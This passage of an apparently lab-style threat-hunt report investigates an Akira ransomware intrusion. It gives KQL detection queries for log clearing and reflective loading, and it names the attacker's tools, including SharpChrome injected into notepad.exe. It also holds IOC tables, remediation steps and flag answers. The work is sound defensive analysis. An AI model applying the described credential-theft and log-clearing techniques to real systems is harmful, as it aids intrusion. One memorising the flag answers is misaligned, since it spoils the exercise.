<img width="1630" height="793" alt="image" src="https://github.com/user-attachments/assets/f6fb5bdf-4d5a-4e39-ba7d-232d84922d5e" />


**📝 Analysis:**
The SHA256 hash was recorded for `Shares.7z` at both its original location (`C:\Shares.7z`) and its copied location (`C:\Shares\Clients\Shares.7z`), confirming the file was not modified between creation and staging. This hash uniquely identifies the staged archive and can be used to correlate with the later `exfil_data.zip` created by `st.exe` on January 27th, linking the data staging phase to the eventual exfiltration event.

---

### SECTION 9: ANTI-FORENSICS & MEMORY 🧹

---

#### Flag 37: Log Clearing
**❓ Question:** Name any two logs that were cleared.

**✅ Answer:** `Windows PowerShell, System`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has_any ("wevtutil", "cl", "Clear-EventLog")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

<img width="1596" height="598" alt="image" src="https://github.com/user-attachments/assets/bd13fb20-e543-4d92-8f9f-c6f017f2be05" />


**📝 Analysis:**
The attacker cleared at least two critical Windows event logs **Windows PowerShell** and **System** to cover their tracks (MITRE T1070.001: Indicator Removal - Clear Windows Event Logs). Clearing the PowerShell log removes evidence of all PowerShell commands executed during the attack, including reconnaissance, credential dumping, and lateral movement. Clearing the System log destroys records of service installations, driver loads, and system restarts that would reveal persistence mechanisms and privilege escalation activity. This is a standard anti-forensics technique employed in the final stages of an intrusion.

---

#### Flag 38: Reflective Loading
**❓ Question:** What ActionType recorded reflective code loading?

**✅ Answer:** `ClrUnbackedModuleLoaded`

**🔎 How it was found:** KQL Query

```kql
DeviceEvents
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where ActionType in ("ClrUnbackedModuleLoaded", "CreateRemoteThreadApiCall",
  "NtAllocateVirtualMemoryApiCall", "NtAllocateVirtualMemoryRemoteApiCall")
| project TimeGenerated, DeviceName, ActionType, FileName, ProcessCommandLine,
  InitiatingProcessFileName, AdditionalFields
| sort by TimeGenerated asc
```

<img width="1767" height="571" alt="image" src="https://github.com/user-attachments/assets/49423cc1-2a9d-488d-98ca-327c2b23c94f" />


**📝 Analysis:**
Microsoft Defender for Endpoint recorded multiple `ClrUnbackedModuleLoaded` events, which detect .NET CLR assemblies loaded reflectively into memory without being backed by a file on disk. This is a hallmark of fileless malware techniques. Several instances were observed: on AS-PC2 at 03:53 UTC with a randomly-named module `xt3iwkkb` loaded into PowerShell, on AS-SRV at 03:54 UTC with modules `2wve5iqe` and `ebor2cia`, and critically on AS-PC1 at 05:09 UTC where the named tool **SharpChrome** was loaded into notepad.exe. The random module names and zeroed PDB signatures are strong indicators of malicious reflective loading, as legitimate .NET assemblies would have proper file paths and debug signatures.

---

#### Flag 39: Memory Tool
**❓ Question:** What credential theft tool was loaded into memory?

**✅ Answer:** `SharpChrome`

**🔎 How it was found:** Same KQL query as Flag 38.

<img width="1737" height="263" alt="image" src="https://github.com/user-attachments/assets/61d1e0be-99fc-4ca6-b61b-d9487d0db1fa" />


**📝 Analysis:**
At 05:09:53 UTC on AS-PC1, a `ClrUnbackedModuleLoaded` event captured a .NET assembly with the `ModuleILPathOrName` of **SharpChrome** being reflectively loaded into memory. SharpChrome is a credential theft tool from the GhostPack offensive security toolkit, designed to extract saved passwords, cookies, and login data from Chromium-based browsers (Chrome, Edge) by decrypting locally stored credentials using Windows DPAPI (MITRE T1555.003: Credentials from Web Browsers). The tool was loaded twice — at 05:09:53 and 05:10:08 — suggesting multiple execution attempts. The initiating process was `Daniel_Richardson_CV.pdf.exe`, confirming the original payload orchestrated the credential theft without ever writing SharpChrome to disk.

---

#### Flag 40: Host Process
**❓ Question:** What legitimate process hosted the malicious assembly?
**✅ Answer:** `notepad.exe`

**🔎 How it was found:** Same KQL query as Flag 38.

<img width="1722" height="612" alt="image" src="https://github.com/user-attachments/assets/17e7e96f-2bc4-47c4-b8dc-dce66380c710" />


**📝 Analysis:**
SharpChrome was injected into `notepad.exe` on AS-PC1 — a classic process injection technique (MITRE T1055: Process Injection). Notepad.exe is a frequently targeted host process because it is universally trusted, commonly running on Windows systems, and unlikely to trigger security alerts. The attack chain shows `Daniel_Richardson_CV.pdf.exe` spawning a `CreateRemoteThreadApiCall` into notepad.exe at 05:09:53 UTC, immediately followed by the `ClrUnbackedModuleLoaded` event for SharpChrome within the same process. The IntegrityLevel of 12288 (High) confirms the injection was performed with elevated privileges.

---

## 🗺️ Full Kill Chain Summary (MITRE ATT&CK)

| Phase | Technique | Evidence |
|-------|-----------|----------|
| Initial Access | T1204.002 User Execution | sophie.turner double-clicked Daniel_Richardson_CV.pdf.exe |
| Execution | T1055.012 Process Hollowing | notepad.exe "" spawned and injected |
| Persistence | T1219 Remote Access Software | AnyDesk deployed across 3 hosts |
| Persistence | T1053.005 Scheduled Task | MicrosoftEdgeUpdateCheck task created |
| Persistence | T1136.001 Local Account | svc_backup backdoor account created |
| Credential Access | T1003.002 SAM Dump | SAM and SYSTEM hives exported via reg.exe |
| Credential Access | T1555.003 Browser Credentials | SharpChrome reflectively loaded into notepad.exe |
| Discovery | T1033 / T1135 / T1069.001 | whoami, net view, net localgroup Administrators |
| Lateral Movement | T1021.001 RDP | mstsc.exe used after WMIC/PsExec failures |
| Collection | T1560.001 Archive via Utility | Shares.7z created with 7-Zip |
| Exfiltration | T1041 Exfiltration Over C2 | exfil_data.zip created by st.exe |
| Defense Evasion | T1070.001 Log Clearing | PowerShell and System logs cleared |
| Defense Evasion | T1055 Process Injection | ClrUnbackedModuleLoaded into notepad.exe |
| Impact | T1486 Data Encrypted for Impact | Akira ransomware (.akira extension) |

---

## 🛡️ Indicators of Compromise (IOCs)

### 🌐 Domains
| Domain | Purpose |
|--------|---------|
| cdn.cloud-endpoint.net | Command & Control |
| sync.cloud-endpoint.net | Payload Staging |

### 📁 Files & Hashes
| Filename | SHA256 | Context |
|----------|--------|---------|
| Daniel_Richardson_CV.pdf.exe | 48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5 | Initial payload |
| RuntimeBroker.exe | 48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5 | Renamed persistence payload (same hash) |
| Shares.7z | 6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048 | Staged archive |
| exfil_data.zip | 082fb434ee2a2663343ab2d3088435cd49ceaf8168521ed7e0613ddb4ac90ec0 | Exfiltration archive |
| st.exe | — | Exfiltration tool |
| AnyDesk.exe | f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532 | Legitimate tool abused for persistence |
| BACS_Payments_Dec2025.ods | — | Targeted sensitive document |

### 👤 Compromised Accounts
| Account | Role in Attack |
|---------|---------------|
| sophie.turner | Initial compromise victim |
| david.mitchell | Lateral movement account |
| as.srv.administrator | Server-level access, data staging |
| svc_backup | Attacker-created backdoor account |

### 🔧 Tools Used by Attacker
| Tool | Purpose |
|------|---------|
| SharpChrome | Browser credential theft (GhostPack) |
| AnyDesk | Persistent remote access |
| certutil.exe | LOLBin for file downloads |
| 7zG.exe | Data archival for exfiltration |
| st.exe | Data exfiltration |
| mstsc.exe | RDP lateral movement |
| PsExec | Remote execution (failed) |
| WMIC | Remote execution (failed) |

---

## 💡 Recommendations

1. **🔴 Immediate — Isolate all affected hosts** (AS-PC1, AS-PC2, AS-SRV) from the network to prevent further lateral movement or data exfiltration.
2. **🔴 Immediate — Reset all compromised account passwords** (sophie.turner, david.mitchell, as.srv.administrator) and disable the svc_backup backdoor account.
3. **🔴 Immediate — Block IOC domains** (cdn.cloud-endpoint.net, sync.cloud-endpoint.net) at the firewall and DNS level.
4. **🟠 Short-term — Remove all AnyDesk installations** and block AnyDesk binaries and network traffic organisation-wide.
5. **🟠 Short-term — Remove the MicrosoftEdgeUpdateCheck scheduled task** and the RuntimeBroker.exe persistence payload from all affected hosts.
6. **🟠 Short-term — Audit all scheduled tasks** across the domain for any additional malicious entries.
7. **🟡 Medium-term — Implement application whitelisting** to prevent execution of unsigned binaries from user-writable directories like `C:\Users\Public\`.
8. **🟡 Medium-term — Deploy LAPS** (Local Administrator Password Solution) to prevent credential reuse across workstations.
9. **🟡 Medium-term — Enable PowerShell ScriptBlock Logging and Module Logging** with centralised log forwarding to prevent effective log clearing.
10. **🟢 Long-term — Conduct security awareness training** focused on double-extension file identification and social engineering via fake CVs/documents.

---

*Report prepared by Chukwuebuka Okorie — SOC Analyst Intern, Log'n Pacific*
*Investigation conducted using Microsoft Defender for Endpoint and Microsoft Sentinel*
